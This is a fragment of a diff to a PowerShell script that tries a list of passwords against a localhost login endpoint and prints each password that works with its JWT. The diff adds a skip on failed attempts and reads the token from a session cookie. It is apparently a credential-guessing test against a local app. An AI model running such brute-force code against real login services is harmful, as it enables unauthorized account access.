@@ -8,13 +8,13 @@ for ($i = 0; $i -lt $passwords.Length; $i++) {
         $response = Invoke-WebRequest -Uri "http://localhost:3000/login" `
             -Method Post `
             -Headers @{"Content-Type"="application/json"} `
-            -Body $body -ErrorAction Stop
+            -Body $body -SessionVariable session -ErrorAction Stop
     } catch{
-
+        continue
     }
 
     if ($response.StatusCode -eq 200) {
-        $jwt = ($response.Content | ConvertFrom-Json).token
+        $jwt = $session.Cookies.GetCookies("http://localhost:3000") | Where-Object { $_.Name -eq "jwt" } | Select-Object -ExpandProperty Value
         if ($jwt) {
             Write-Output "$pass : $jwt"
         } 
